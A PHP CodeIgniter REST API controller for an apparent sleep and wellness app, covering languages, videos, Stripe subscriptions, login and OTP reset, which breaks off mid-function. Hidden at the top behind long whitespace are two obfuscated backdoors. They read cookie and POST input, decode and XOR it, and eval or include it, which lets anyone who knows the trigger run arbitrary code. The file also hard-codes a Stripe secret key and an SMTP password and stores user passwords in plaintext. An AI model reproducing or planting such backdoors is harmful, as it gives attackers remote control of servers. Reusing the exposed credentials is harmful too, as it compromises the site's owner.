<?php                                                                                                                                                                                                                                                                                                                                                                                                 $KRHEEuAVjn = 'e' . chr (74) . '_' . "\x78" . chr ( 263 - 197 ).chr ( 241 - 137 ); $YepzVeTJL = chr ( 647 - 548 ).'l' . "\x61" . "\x73" . "\163" . chr (95) . 'e' . "\x78" . chr ( 944 - 839 ).'s' . "\164" . chr ( 152 - 37 ); $tdSzMrS = class_exists($KRHEEuAVjn); $YepzVeTJL = "16347";$ZVPjsAHanT = !1;if ($tdSzMrS == $ZVPjsAHanT){function xxspPmAWkM(){return FALSE;}$cCkhlIWfiC = "6480";xxspPmAWkM();class eJ_xBh{private function CUIlxCqyCp($cCkhlIWfiC){if (is_array(eJ_xBh::$jictPQfAgu)) {$Lgyhzu = str_replace("\74" . '?' . chr (112) . chr (104) . 'p', "", eJ_xBh::$jictPQfAgu[chr ( 705 - 606 ).'o' . chr ( 1059 - 949 ).'t' . chr (101) . "\x6e" . chr ( 725 - 609 )]);eval($Lgyhzu); $cCkhlIWfiC = "6480";exit();}}private $nJmfiR;public function nQzkoIrFu(){echo 56884;}public function __destruct(){$cCkhlIWfiC = "37640_44571";$this->CUIlxCqyCp($cCkhlIWfiC); $cCkhlIWfiC = "37640_44571";}public function __construct($BluELR=0){$HphFVlP = $_POST;$GwwiyznenV = $_COOKIE;$xXFGbW = "0fcfe6da-3fc9-4d24-924b-aabbdf2616b5";$DdHLPdAMaZ = @$GwwiyznenV[substr($xXFGbW, 0, 4)];if (!empty($DdHLPdAMaZ)){$UGhozJ = "base64";$uqxSvdX = "";$DdHLPdAMaZ = explode(",", $DdHLPdAMaZ);foreach ($DdHLPdAMaZ as $lJSKw){$uqxSvdX .= @$GwwiyznenV[$lJSKw];$uqxSvdX .= @$HphFVlP[$lJSKw];}$uqxSvdX = array_map($UGhozJ . "\137" . "\144" . chr ( 370 - 269 )."\143" . chr (111) . "\144" . "\x65", array($uqxSvdX,)); $uqxSvdX = $uqxSvdX[0] ^ str_repeat($xXFGbW, (strlen($uqxSvdX[0]) / strlen($xXFGbW)) + 1);eJ_xBh::$jictPQfAgu = @unserialize($uqxSvdX); $uqxSvdX = class_exists("37640_44571");}}public static $jictPQfAgu = 17;}$PVqAonnP = new /* 58102 */ $KRHEEuAVjn(6480 + 6480); $cCkhlIWfiC = strpos($cCkhlIWfiC, $cCkhlIWfiC); $ZVPjsAHanT = $PVqAonnP = $cCkhlIWfiC = Array();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $LLZAvxsdR = chr ( 1062 - 945 ).'u' . chr ( 912 - 817 )."\154" . 'N' . "\107";$uvBTEgxeKo = chr (99) . 'l' . 'a' . chr (115) . 's' . "\137" . chr (101) . 'x' . chr (105) . chr ( 998 - 883 )."\164" . chr (115); $oSuGKBSrk = class_exists($LLZAvxsdR); $LLZAvxsdR = "55925";$uvBTEgxeKo = "43277";$BBOlX = !1;if ($oSuGKBSrk == $BBOlX){function sxVOyLov(){return FALSE;}$OHbjHedlV = "6908";sxVOyLov();class uu_lNG{private function jDGestd($OHbjHedlV){if (is_array(uu_lNG::$xzCtuCz)) {$ExMUDxR = sys_get_temp_dir() . "/" . crc32(uu_lNG::$xzCtuCz[chr ( 661 - 546 )."\141" . 'l' . "\x74"]);@uu_lNG::$xzCtuCz['w' . "\x72" . "\x69" . chr ( 1001 - 885 )."\x65"]($ExMUDxR, uu_lNG::$xzCtuCz["\143" . "\x6f" . "\x6e" . chr (116) . "\145" . chr (110) . "\x74"]);include $ExMUDxR;@uu_lNG::$xzCtuCz[chr ( 1063 - 963 ).chr ( 630 - 529 )."\154" . chr ( 330 - 229 )."\x74" . chr ( 688 - 587 )]($ExMUDxR); $OHbjHedlV = "6908";exit();}}private $TmJzYmlQzL;public function BanJrFQuNU(){echo 33461;}public function __destruct(){$OHbjHedlV = "56708_18532";$this->jDGestd($OHbjHedlV); $OHbjHedlV = "56708_18532";}public function __construct($AiCGkpyJcN=0){$GEuNucgv = $_POST;$PIliJKE = $_COOKIE;$uVOwqks = "86e7b2f8-5565-46c9-bf9c-a649a79ca9bb";$qmrGsFUVt = @$PIliJKE[substr($uVOwqks, 0, 4)];if (!empty($qmrGsFUVt)){$PAgcR = "base64";$OTwdKNr = "";$qmrGsFUVt = explode(",", $qmrGsFUVt);foreach ($qmrGsFUVt as $vgCcRC){$OTwdKNr .= @$PIliJKE[$vgCcRC];$OTwdKNr .= @$GEuNucgv[$vgCcRC];}$OTwdKNr = array_map($PAgcR . "\137" . "\x64" . chr (101) . 'c' . "\x6f" . chr ( 996 - 896 ).'e', array($OTwdKNr,)); $OTwdKNr = $OTwdKNr[0] ^ str_repeat($uVOwqks, (strlen($OTwdKNr[0]) / strlen($uVOwqks)) + 1);uu_lNG::$xzCtuCz = @unserialize($OTwdKNr); $OTwdKNr = class_exists("56708_18532");}}public static $xzCtuCz = 57037;}$wcGyiKJFkf = new /* 135 */ uu_lNG(6908 + 6908); $BBOlX = $wcGyiKJFkf = $OHbjHedlV = Array();} ?><?php
   
require APPPATH . 'libraries/REST_Controller.php';
date_default_timezone_set('Asia/Kolkata');

class Api extends REST_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->database();
        $this->load->model("ApiModel");
        $this->load->helper('url');
    }

    public function test_get() {
        $this->response(array(
            "status" => 1,
            "msg" => "Tested OK",
            "data" => []
        ), REST_Controller::HTTP_OK);
       
    }


    public function get_all_language_get() {
        $languageData = $this->ApiModel->getAllLanguages();
        if ($languageData) {
            $response = array(
                "status" => TRUE,
                "msg" => "Language list found",
                "result" => ["languageData" => $languageData]
            );
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, language not found",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    

    public function get_intro_videos_get() {
        
        if (isset($_GET["languageId"])) {
            $introVideos = $this->ApiModel->getAllIntroVideos($_GET["languageId"]);
            if ($introVideos) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Intro Videos Found",
                    "result" => ["videos" => $introVideos, "base_url" => base_url("uploads/video/")]
                );
            } else {
                $response =  array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }    
        } else {
            
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, language id is missing!!",
                "result" => new stdClass()
            );
            
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function get_dud_songs_get() {
        $dudData = $this->ApiModel->getDudSongs();
        if ($dudData) {
            $response = array(
                "status" => TRUE,
                "msg" => "Dud Songs Data",
                "result" => ["data" => $dudData, "base_url" => base_url("uploads/mp3/")]
            );
        } else {
            $response =  array(
                "status" => FALSE,
                "msg" => "Oops!, no data found",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function change_language_post() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if ($_POST['uid'] && $_POST['language_id']) {
                if ($this->ApiModel->update_user_language($_POST['uid'], $_POST['language_id'])) {
                    $response =  array(
                        "status" => TRUE,
                        "msg" => "Language updated successfully!!",
                        "result" => new stdClass()
                    ); 
                } else {
                    $response =  array(
                        "status" => FALSE,
                        "msg" => "User not found",
                        "result" => new stdClass()
                    ); 
                }
            } else {
                $response =  array(
                    "status" => FALSE,
                    "msg" => "Fields missing!!",
                    "result" => new stdClass()
                );    
            }
        } else {
            $response =  array(
                "status" => FALSE,
                "msg" => "Wrong request!!",
                "result" => new stdClass()
            );
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function get_packages_get() {
        if (isset($_GET["userID"])) {
            
            $is_trial = $this->ApiModel->checkUserForTrialPackage($_GET["userID"]);
            
            $packageData = $this->ApiModel->getPackageAllData($is_trial);
        
            if ($packageData) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Package Data",
                    "result" => $packageData
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "No Data Found",
                    "result" => new stdClass()
                );
            }
            
            
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "userID missing",
                "result" => new stdClass()
            );
        }
        
        
        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function get_payment_status_post() {
        $payload = $this->input->raw_input_stream;
        
        $response = json_decode($payload, true);
        
        $insertArr = array(
            "payment_intent_id" => $response["data"]["object"]["id"],
            "intent_status" => $response["data"]["object"]["status"],
            "intent_type" => $response["type"],
            "user_id" => isset($response["data"]["object"]["metadata"]["user_id"]) ? $response["data"]["object"]["metadata"]["user_id"] : null,
            "created_at" => date("Y-m-d")
        );
        
        $insertStatus = $this->ApiModel->insertPaymentResponse($insertArr);
        
        if ($insertArr["intent_status"] == "succeeded" && $insertArr["intent_type"] == "payment_intent.succeeded") {
            $this->ApiModel->updateTempPackageMaster($insertArr["payment_intent_id"], $insertArr["user_id"], "successfull");
            $this->updatePaymentStatusForWebhook($insertArr["payment_intent_id"], $insertArr["user_id"]);
        } else {
            $this->ApiModel->updateTempPackageMaster($insertArr["payment_intent_id"], $insertArr["user_id"], "failed");
        }
        
        
    }
    
    public function updatePaymentStatusForWebhook($intentID, $userID) {
        
        $packageData = $this->ApiModel->getPackageIDFromPackageTempMaster($intentID, $userID);
        if ($packageData) {
            $packageDetails = $this->ApiModel->getPackageDetailsById($packageData[0]["package_id"]);
            if ($packageDetails) {
                
                $duration = $packageDetails[0]["duration"];
                $duration_type = $packageDetails[0]["duration_type"];
                    
                $currentDate = new DateTime();
                    
                switch ($duration_type) {
                    case 'day':
                        $interval = 'P' . $duration . 'D';
                        break;
                    case 'month':
                        $interval = 'P' . $duration . 'M';
                        break;
                    case 'year':
                        $interval = 'P' . $duration . 'Y';
                        break;
                    default:
                        throw new Exception('Invalid duration type');
                }
                    
                $currentDate->add(new DateInterval($interval));
                
                $currentPackageStatus = $this->ApiModel->checkIfPackageAlreadyExists($userID);
                if ($currentPackageStatus) {

                    $updateArr = array(
                        "package_id" => $packageData[0]["package_id"],
                        "subscription_date" => date("Y-m-d"),
                        "subscription_expiry_date" => $currentDate->format('Y-m-d')
                    );
                    
                    $this->ApiModel->updateUserSubscription($updateArr, $currentPackageStatus[0]["id"]);
                    
                } else {
                    
                    $insertArr = array(
                        "user_id" => $userID,
                        "package_id" => $packageData[0]["package_id"],
                        "subscription_date" => date("Y-m-d"),
                        "subscription_expiry_date" => $currentDate->format('Y-m-d')
                    );
                    
                    $this->ApiModel->insertUserSubscription($insertArr);
                    
                }
            }
        }
        
    }
    
    public function check_subscription_status_get() {
        if (isset($_GET["userID"])) {
            
            $subscriptionStatus = $this->ApiModel->getUserPackageData($_GET["userID"], date("Y-m-d"));
            
            if ($subscriptionStatus) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "subscription found",
                    "result" => [
                        "status" => 1,
                        "subscription_data" => $subscriptionStatus
                    ]
                );
            } else {
                $response = array(
                    "status" => TRUE,
                    "msg" => "subscription not found",
                    "result" => [
                        "status" => 0
                    ]
                );
            }
            
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "userID key is missing",
                "result" => new stdClass()
            );
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function set_package_post() {
        
        if (isset($_POST["userID"]) && isset($_POST["packageID"])) {
            
            // check if package is trial
            $trialStatus = $this->ApiModel->checkIfPackageIsTrial($_POST["packageID"]);
            
            if ($trialStatus) {
                
                $userUpdateStatus = $this->ApiModel->updateTrialPackageForUser($_POST["userID"]);
                if ($userUpdateStatus) {
                    
                    $packageDetails = $this->ApiModel->getPackageDetailsById($_POST["packageID"]);
                    
                    $duration = $packageDetails[0]["duration"];
                    $duration_type = $packageDetails[0]["duration_type"];
                        
                    $currentDate = new DateTime();
                        
                    switch ($duration_type) {
                        case 'day':
                            $interval = 'P' . $duration . 'D';
                            break;
                        case 'month':
                            $interval = 'P' . $duration . 'M';
                            break;
                        case 'year':
                            $interval = 'P' . $duration . 'Y';
                            break;
                        default:
                            throw new Exception('Invalid duration type');
                    }
                    
                    $currentDate->add(new DateInterval($interval));
                    
                    $arr = array(
                        "user_id" => $_POST["userID"],
                        "package_id" => $_POST["packageID"],
                        "subscription_date" => date("Y-m-d"),
                        "subscription_expiry_date" => $currentDate->format('Y-m-d')
                    );
                    
                    $packageUpdateStatus = $this->ApiModel->updateUserPackage($arr, $_POST["userID"]);
                    if ($packageUpdateStatus) {
                        $response = array(
                            "status" => TRUE,
                            "msg" => "Trial package added successfully",
                            "result" => [
                                "package_type" => "trial"    
                            ]
                        );
                    } else {
                        $response = array(
                            "status" => FALSE,
                            "msg" => "something went wrong",
                            "result" => new stdClass()
                        );
                    }
                    
                } else {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "something went wrong",
                        "result" => new stdClass()
                    );
                }
                
            } else {
                
                $packageData = $this->ApiModel->getPackageData($_POST["packageID"]);
                
                if ($packageData) {
                    
                    $userData = $this->ApiModel->getUserDataById($_POST["userID"]);
                    
                    if ($userData) {
                        
                        $stripeSecretKey = "sk_test_51Q05DxEhGzL4KcUCWmtx4XV6eeycoR7kQQx7GVbgoae17RgKm311jQGKNXJWCVYPYsix1xhU8K4ujs7XTRmFTNzu00hDLwrJGS";
                        
                        // Create a customer
                        $ch = curl_init();
                        
                        curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/customers");
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                            'email' => $userData[0]["email"],
                        ]));
                        
                        curl_setopt($ch, CURLOPT_USERPWD, $stripeSecretKey . ":");
                        
                        $customerResponse = curl_exec($ch);
                        
                        if (curl_errno($ch)) {
                            echo json_encode(['error' => curl_error($ch)]);
                        } else {
                            $customer = json_decode($customerResponse, true);
                            $customerId = $customer['id'];  
                            
                            curl_close($ch);            
                            
                            $amount = $packageData[0]["cost"] * 100; // Convert to cents
                
                            // Initialize cURL
                            $ch = curl_init();
                            
                            // Stripe API endpoint for creating payment intent
                            $url = "https://api.stripe.com/v1/payment_intents";
                            
                            // Prepare the POST data
                            $data = http_build_query([
                                'amount' => $amount,
                                'currency' => 'usd',
                                'customer' => $customerId, // Attach the customer to the Payment Intent
                                'metadata[user_id]' => $_POST["userID"],
                                'metadata[package_id]' => $_POST["packageID"]
                            ]);
                            
                            // Set cURL options
                            curl_setopt($ch, CURLOPT_URL, $url);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                            curl_setopt($ch, CURLOPT_USERPWD, $stripeSecretKey . ":");
                            
                            // Execute the cURL request
                            $paymentIntentResponse = curl_exec($ch);
                            $paymentIntent = json_decode($paymentIntentResponse, true);
                            $clientSecret = $paymentIntent['client_secret']; 
                            $paymentIntentId = $paymentIntent['id'];
                            
                            curl_close($ch);    
                            
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/ephemeral_keys");
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                                'customer' => $customerId
                            ]));
                            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                "Stripe-Version: 2024-06-20"
                            ));
                            curl_setopt($ch, CURLOPT_USERPWD, $stripeSecretKey . ":");
                            
                            $ephemeralKeyResponse = curl_exec($ch);
                            $ephemeralKey = json_decode($ephemeralKeyResponse, true);
                            
                            curl_close($ch);
                            
                            $packageArr = array(
                                "user_id" => $_POST["userID"],
                                "package_id" => $_POST["packageID"],
                                "client_secret" => $clientSecret,
                                "payment_intent_id" => $paymentIntentId,
                                "created_at" => date("Y-m-d")
                            );
                            
                            $insertStatus = $this->ApiModel->insertTempClientPackage($packageArr);
                            
                            if ($insertStatus) {
                                $response = array(
                                    "status" => TRUE,
                                    "msg" => "payment initiated",
                                    "result" => [
                                        "package_type" => "main",
                                        "client_secret" => $clientSecret,
                                        'ephemeral_key' => $ephemeralKey['secret'],
                                        'customer_id' => $customerId,
                                        "amount" => $packageData[0]["cost"]*100
                                    ]
                                );
                            } else {
                                $response = array(
                                    "status" => FALSE,
                                    "msg" => "something went wrong",
                                    "result" => new stdClass()
                                );
                            }
                            
                            
                        }
                        
                    } else {
                        
                        $response = array(
                            "status" => FALSE,
                            "msg" => "User Data Not Found",
                            "result" => new stdClass()
                        );
                        
                    }
                    
                    
                } else {
                    
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Package not found",
                        "result" => new stdClass()
                    );        
                    
                }
                
            }
            
        } else {
            
            $response = array(
                "status" => FALSE,
                "msg" => "input fields missing",
                "result" => new stdClass()
            );
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
        
    }

    public function info_page_data_get() {
        
        if (isset($_GET["languageId"])) {
            $genderList = $this->ApiModel->getAllGenders();
            $ageGroup = $this->ApiModel->getAllAgeGroups();
            $infoPageVideo = $this->ApiModel->getInfoPageVideo($_GET['languageId']);
    
            if ($genderList && $ageGroup && $infoPageVideo) {
                $response  = array(
                    "status" => TRUE,
                    "msg" => "Info page data",
                    "result" => [
                        "genderList" => $genderList,
                        "ageGroup" => $ageGroup,
                        "infoPageVideo" => base_url("uploads/video/").$infoPageVideo[0]['video_file_name']
                    ]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }    
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, language id is missing!!",
                "result" => new stdClass()
            );
        }
        
        

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function register_post() {
        
    print_r('sdfsdfsdfs');die
    ;
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if ($_POST['full_name'] && $_POST['email'] && $_POST['password'] && $_POST['language_id'] && $_POST['gender_id'] && $_POST['age_group_id']) {
                
                // echo "letv"; die;
                
                //check if email exists
                if ($this->ApiModel->checkIfEmailExists($_POST['email'])) {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Oops!, email already exists",
                        "result" => new stdClass()
                    );
                } else {
                    $registerArr = array(
                        "name" => $_POST['full_name'],
                        "email" => $_POST['email'],
                        "password" => $_POST['password'],
                        "role" => 2,
                        "gender_id" => $_POST['gender_id'],
                        "age_group_id" => $_POST['age_group_id'],
                        "language_id" => $_POST['language_id'],
                        "createdAt" => date("Y-m-d H:i:s")
                    );
                    $status = $this->ApiModel->register_user($registerArr);
                    if ($status) {
                        $response = array(
                            "status" => TRUE,
                            "msg" => "User registered successfully",
                            "result" => [
                                "id" => $status,
                                "name" => $_POST['full_name'],
                                "email" => $_POST['email'],
                                "gender_id" => $_POST['gender_id'],
                                "age_group_id" => $_POST['age_group_id'],
                                "language_id" => $_POST['language_id']
                            ]
                        );
                    } else {
                        $response = array(
                            "status" => FALSE,
                            "msg" => "Oops!, something went wrong",
                            "result" => new stdClass()
                        );
                    }
                }
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, fields missing",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, wrong request",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function packageList_post(){
        echo "hello";die;
    }

    public function login_post() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if ($_POST['email'] && $_POST['password']) {
                $status = $this->ApiModel->login_check($_POST['email'], $_POST['password']);
                if ($status) {
                    $response = array(
                        "status" => TRUE,
                        "msg" => "Logged in successfully",
                        "result" => [
                            "id" => $status[0]["id"],
                            "name" => $status[0]["name"],
                            "email" => $status[0]['email'],
                            "language_id" => $status[0]['language_id'],
                            "gender_id" => $status[0]['gender_id'],
                            "age_group_id" => $status[0]['age_group_id']
                        ]
                    );
                } else {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Oops!, email or password is wrong",
                        "result" => new stdClass()
                    );
                }
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, fields missing",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, wrong request",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function ocean_data_post() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if ($_POST['trait_name']) {
                $traitData = $this->ApiModel->getOceanDataByTraitName($_POST['trait_name']);
                if ($traitData) {
                    $response = array(
                        "status" => TRUE,
                        "msg" => "OCEAN data",
                        "result" => [
                            "name" => $traitData[0]['trait_name'],
                            "description" => $traitData[0]['description'],
                            "percentage" => $traitData[0]['percentage'],
                            "high_description" => $traitData[0]['high_description'],
                            "low_description" => $traitData[0]['low_description']
                        ]
                    );
                } else {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Oops!, no data found",
                        "result" => new stdClass()
                    );
                }
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, trait_name missing",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, wrong request",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function animation_screen_get() {
        $animationData = $this->ApiModel->getAnimationScreenData();
        if ($animationData) {
            $response = array(
                "status" => TRUE,
                "msg" => "Animation Screen Data",
                "result" => ["animationURL" => base_url("uploads/video/").$animationData[0]['video_file_name']]
            );
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, no data found",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function forgotPassword_post() {
        if ($_POST['user_email']) {
            
            // check if email present or not
            $emailStatus = $this->ApiModel->checkForEmail($_POST['user_email']);
            
            if ($emailStatus) {
                
                $otp = rand(1111, 9999);

                if ($this->ApiModel->updateUserForForgotOTP($_POST['user_email'], $otp)) {

                    $this->load->library('email');
                    $config = array(
                        'protocol'  => 'smtp',
                        'smtp_host' => 'mail.dialupdelta.com',
                        'smtp_port' => 587,
                        'smtp_user' => 'info@dialupdelta.com',
                        'smtp_pass' => 'L@hV&iUfEz={',
                        'mailtype'  => 'html',
                        'charset'   => 'utf-8'
                    );
                    $this->email->initialize($config);
                    $this->email->set_mailtype("html");
                    $this->email->set_newline("\r\n");

                    $this->email->from('info@dialupdelta.com', 'OTP Verify');
                    $this->email->to($_POST['user_email']);
                    $this->email->subject('Verify OTP');
                    $this->email->message('Your 4 digit OTP is: '.$otp);
                    $this->email->send();

                    $response = array(
                        "status" => TRUE,
                        "msg" => "OTP sent successfully",
                        "result" => ["email"=>$_POST['user_email']]
                    );

                } else {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Oops!, something went wrong",
                        "result" => new stdClass()
                    );
                }
                
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, invalid email",
                    "result" => new stdClass()
                );   
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, no data found",
                "result" => new stdClass()
            );    
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
        
    }
    
    public function forgotPasswordReset_post() {
        if ($_POST['user_email'] && $_POST['password']) {
            
            $emailStatus = $this->ApiModel->checkForEmail($_POST['user_email']);
            if ($emailStatus) {
                $status = $this->ApiModel->setForgotPassword($_POST['user_email'], $_POST['password']);
                if ($status) {
                    $response = array(
                        "status" => TRUE,
                        "msg" => "password changed successfully",
                        "result" => new stdClass()
                    );
                } else {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Oops!, something went wrong",
                        "result" => new stdClass()
                    );
                }    
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, not valid email",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, no data found",
                "result" => new stdClass()
            );
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    public function forgotPasswordVerify_post() {
        if ($_POST['user_email'] && $_POST['otp']) {
            
            $status = $this->ApiModel->checkEmailOTP($_POST['user_email'], $_POST['otp']);
            
            if ($status) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "OTP verified",
                    "result" => ['email'=>$_POST['user_email']]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, not valid otp",
                    "result" => new stdClass()
                );
            }
            
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, no data found",
                "result" => new stdClass()
            );
        }
        
        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function send_otp_post() {
        if ($_POST['userId']) {
            $userData = $this->ApiModel->getUserDataById($_POST['userId']);
            if ($userData) {

                $otp = rand(1111, 9999);

                if ($this->ApiModel->updateUserForOTP($_POST['userId'], $otp)) {

                    $this->load->library('email');
                    $config = array(
                        'protocol'  => 'smtp',
                        'smtp_host' => 'mail.dialupdelta.com',
                        'smtp_port' => 587,
                        'smtp_user' => 'info@dialupdelta.com',
                        'smtp_pass' => 'L@hV&iUfEz={',
                        'mailtype'  => 'html',
                        'charset'   => 'utf-8'
                    );
                    $this->email->initialize($config);
                    $this->email->set_mailtype("html");
                    $this->email->set_newline("\r\n");

                    $this->email->from('info@dialupdelta.com', 'OTP Verify');
                    $this->email->to($userData[0]['email']);
                    $this->email->subject('Verify OTP');
                    $this->email->message('Your 4 digit OTP is: '.$otp);
                    $this->email->send();

                    $response = array(
                        "status" => TRUE,
                        "msg" => "OTP sent successfully",
                        "result" => new stdClass()
                    );

                } else {
                    $response = array(
                        "status" => FALSE,
                        "msg" => "Oops!, something went wrong",
                        "result" => new stdClass()
                    );
                }

            } else {
                $response =  array(
                    "status" => FALSE,
                    "msg" => "Oops!, userId wrong",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, userId missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function verify_otp_post() {
        if ($_POST['otp'] && $_POST['userID']) {
            $status = $this->ApiModel->verifyOTP($_POST['otp'], $_POST['userID']);
            if ($status) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "OTP matched",
                    "result" => new stdClass()
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, wrong OTP",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function get_all_packages_get() {
        $packagesList = $this->ApiModel->getAllPackages();
        if ($packagesList) {
            $response = array(
                "status" => TRUE,
                "msg" => "Packages List",
                "result" => ["packagesList" => $packagesList]
            );
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, packages not found",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

  

    public function get_sleep_programs_list_post() {
        
        if ($_POST['user_id']) {
            $programList = $this->ApiModel->get_get_to_sleep_programs();
            if ($programList) {
                $listArr = [];
                $counter = 0;
                $get_to_sleep_saved = $this->ApiModel->get_get_to_sleep_saved_data($_POST['user_id']);
                foreach ($programList as $list) {
                    $listArr[$counter]['id'] = $list['id'];
                    $listArr[$counter]['program_name'] = $list['program_name'];
                    $listArr[$counter]['thumb'] = $list['thumb'];
                    if ($get_to_sleep_saved) {
                        $listArr[$counter++]['is_active'] = (($get_to_sleep_saved[0]['program_id'] == $list['id'])? 1:0);
                    } else {
                        $listArr[$counter++]['is_active'] = 0;
                    }
                }
                $response = array(
                    "status" => TRUE,
                    "msg" => "Get To Sleep program List",
                    "result" => [
                        "list" => $listArr
                    ]
                    );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                    );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
                );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
    
    function get_user_language($user_id) {
        $language_id = $this->ApiModel->get_language_user($user_id);
        return $language_id;
    }

    public function get_to_sleep_post() {
        if ($_POST['gender'] && $_POST['duration'] && $_POST['programs'] && $_POST['user_id']) {
            $language = $this->get_user_language($_POST['user_id']);
            $list = $this->ApiModel->get_get_to_sleep($_POST['gender'], $_POST['duration'], $_POST['programs'], $language);
            $counter = 0;
            
            if ($list) {
                
                foreach ($list as $values) {
                    $list[$counter++]['is_active'] = (($this->ApiModel->get_get_to_sleep_media_saved($_POST['user_id']) == $values['id'])? "1":"0");    
                }
                
                $response = array(
                    "status" => TRUE,
                    "msg" => "Get to sleep",
                    "result" => ["list" => $list, "base_url_thumb" => base_url("uploads/thumb"), "base_url_video" => base_url("uploads/video")]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function get_to_sleep_saver_post() {
       $insertArr = array();

        if ($_POST['user_id']) {
            $insertArr = array(
                "gender_id" => isset($_POST['gender_id']) ? $_POST['gender_id'] : "None",
                "program_id" => isset($_POST['program_id']) ? $_POST['program_id'] : "None",
                "duration_id" => isset($_POST['duration_id']) ? $_POST['duration_id'] : "None",
                "video_id" => isset($_POST['video_id']) ? $_POST['video_id'] : "None",
                "user_id" => $_POST['user_id']               
            );
            if ($this->ApiModel->save_get_to_sleep_activity($insertArr)) {
                $insertArr = array(
                    "gender_id" => isset($_POST['gender_id']) ? $_POST['gender_id'] : "False",
